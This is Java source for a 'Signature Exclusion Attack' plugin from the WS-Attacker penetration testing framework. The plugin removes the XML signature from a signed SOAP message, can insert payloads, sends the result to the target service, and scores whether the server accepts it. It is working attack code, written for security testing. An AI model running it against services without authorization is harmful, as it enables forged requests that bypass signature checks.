/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2011 Christian Mainka
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.signatureWrapping;

import com.eviware.soapui.impl.wsdl.WsdlRequest;
import com.eviware.soapui.impl.wsdl.WsdlSubmit;
import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
import com.eviware.soapui.impl.wsdl.support.soap.SoapUtils;
import com.eviware.soapui.impl.wsdl.support.soap.SoapVersion;
import com.eviware.soapui.model.iface.Request.SubmitException;
import java.util.*;
import javax.xml.xpath.XPathExpressionException;
import org.apache.xmlbeans.XmlException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.SAXException;
import wsattacker.library.signatureWrapping.option.Payload;
import wsattacker.library.signatureWrapping.util.dom.DomUtilities;
import wsattacker.library.signatureWrapping.util.signature.SignatureRemover;
import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.plugin.signatureWrapping.option.OptionManager;
import wsattacker.plugin.signatureWrapping.option.OptionPayload;

/**
 *  Attack Plugin which removes a Signature from an XML message and checks
 * if the server accepts it.
 */
public class SignatureExclusionAttack extends AbstractPlugin {

	private static final String NAME = "Signature Exclusion Attack";
	private static final String AUTHOR = "Christian Mainka";
	private static final String VERSION = "1.0 / 2012-11-07";
	;
	private static final String DESCRIPTION = "Attack which removes the XML Signature within a signed message."
	  + "\n\n"
	  + "Background\n"
	  + "In some cases, the signature verification logic only verifies"
	  + "a signature, if one is present."
	  + "Otherwise it will just forward the message to the application logic."
	  + "\n\n"
	  + "This attack plugin will fail, if no <ds:Signature> element can be found"
	  + "\n\n"
	  + "You can configure the Payloads/Timestamps etc. in the Signature Wrapping Plugin."
	  + "\nNote, that it is not necessary to enable the XSW Plugin, it can only be used"
	  + "for configuration.";
	private WsdlRequest attackRequest = null;
	private String originalSoapAction = null;

	@Override
	public void initializePlugin() {
		setState(PluginState.Ready);
	}

	@Override
	public String getName() {
		return NAME;
	}

	@Override
	public String getDescription() {
		return DESCRIPTION;
	}

	@Override
	public String getAuthor() {
		return AUTHOR;
	}

	@Override
	public String getVersion() {
		return VERSION;
	}

	@Override
	public int getMaxPoints() {
		return 100;
	}

	@Override
	public boolean wasSuccessful() {
		return getCurrentPoints() == getMaxPoints();
	}

	@Override
	public String[] getCategory() {
		return new String[]{
			  "Security", "Signature"
		  };
	}

	@Override
	public void clean() {
		removeAttackReqeust();
		setCurrentPoints(0);
	}

	/**
	 * Observer function which is called if the attack request is removed.
	 */
	public void removeAttackReqeust() {

		if (originalSoapAction != null && attackRequest != null) {
			attackRequest.getOperation().setAction(originalSoapAction);
			originalSoapAction = null;
		}
		// remove attack request
		if (attackRequest != null) {
			attackRequest.getOperation().removeRequest(attackRequest);
			attackRequest = null;
		}
	}

	@Override
	protected void attackImplementationHook(RequestResponsePair original) {
		OptionManager optionManager = OptionManager.getInstance();

		// save needed pointers
		attackRequest = original.getWsdlRequest().getOperation().addNewRequest(getName() + " ATTACK");

		// should the soapaction be changed?
		if (optionManager.getOptionSoapAction().getChoice() > 0) {
			originalSoapAction = attackRequest.getOperation().getAction();
			attackRequest.getOperation().setAction(optionManager.getOptionSoapAction().getValueAsString());
		}

		Element toClone = optionManager.getSignatureManager().getDocument().getDocumentElement();
		Document attackDocument = DomUtilities.createNewDomFromNode(toClone);

		// create the attack document, i.e.
		// update timestamps / add user-payloads
		List<Payload> payloads = optionManager.getSignatureManager().getPayloads();
		for (Payload payload : payloads) {
			if (payload.hasPayload()) {
				Element signedElement = DomUtilities.findCorrespondingElement(attackDocument, payload.getSignedElement());

				Element payloadElement;
				try {
					payloadElement = (Element) attackDocument.importNode(payload.getPayloadElement(), true);
				} catch (Exception e) {
					log().warn("Could not get Payload Element for " + signedElement.getNodeName() + " / Skipping.");
					continue;
				}
				if (signedElement.getParentNode() != null && payloadElement != null) {
					signedElement.getParentNode().replaceChild(payloadElement, signedElement);
				}
			}
		}

		SignatureRemover r = new SignatureRemover(attackDocument);

		String attackDocumentAsString = DomUtilities.domToString(attackDocument);
		attackRequest.setRequestContent(attackDocumentAsString);
		trace("Attack Request: \n\n" + attackDocumentAsString);


		WsdlSubmit<WsdlRequest> submit;
		try {
			submit = attackRequest.submit(new WsdlSubmitContext(attackRequest), false);
		} catch (SubmitException e) {
			log().warn("Could not submit the request. Trying next one.");
			setState(PluginState.Failed);
			return;
		}
		String responseContent;
		responseContent = submit.getResponse().getContentAsString();
		if (responseContent == null) {
			important("The server's answer was empty. Server misconfiguration?");
			setCurrentPoints(10);
		} else {
			try {
				SoapVersion soapVersion = attackRequest.getOperation().getInterface().getSoapVersion();
				if (SoapUtils.isSoapFault(responseContent, soapVersion)) {
					// Now we have to find the SOAPFault reason:
					String xpath;
					if (soapVersion.equals(SoapVersion.Soap11)) {
						xpath = "/*[local-name()='Envelope'][1]/*[local-name()='Body'][1]/*[local-name()='Fault'][1]/*[local-name()='faultstring'][1]";
					} else {
						xpath = "/*[local-name()='Envelope'][1]/*[local-name()='Body'][1]/*[local-name()='Fault'][1]/*[local-name()='Reason'][1]/*[local-name()='Text'][1]";
					}
					// We have a valid response, saving
					Document doc;
					try {
						doc = DomUtilities.stringToDom(responseContent);
						List<Element> match;
						try {
							match = (List<Element>) DomUtilities.evaluateXPath(doc, xpath);
							StringBuilder sb = new StringBuilder();
							for (Element ele : match) {
								sb.append(ele.getTextContent()).append(" ");
							}
							info("Server returned with SOAP Fault: " + sb.toString());
							trace(responseContent);
						} catch (XPathExpressionException ex) {
							info("Server returned with SOAP Fault.");
							trace(responseContent);
						}
					} catch (SAXException ex) {
						java.util.logging.Logger.getLogger(SignatureWrapping.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
					}
				} else if (optionManager.getOptionMustContainString().isOn()) {
					String searchString = optionManager.getOptionTheContainedString().getValue();
					int index = responseContent.indexOf(searchString);
					if (index < 0) {
						setCurrentPoints(50);
						info("The answer does not contain the searchstring:\n" + searchString);
						trace(responseContent);
					} else {
						setCurrentPoints(100);
						important("The answer contains the searchstring:\n" + searchString);
						trace(responseContent);
					}
				} else {
					setCurrentPoints(100);
					important("Server accpeted the Attack message. No SOAP Fault received");
					trace(responseContent);
				}
			} catch (XmlException ex) {
				setCurrentPoints(10);
				info("The answer is not valid XML. Server missconfiguration?");
				trace("Request:\n" + submit.getRequest().getRequestContent());
			}
		}
		removeAttackReqeust();
	}
}
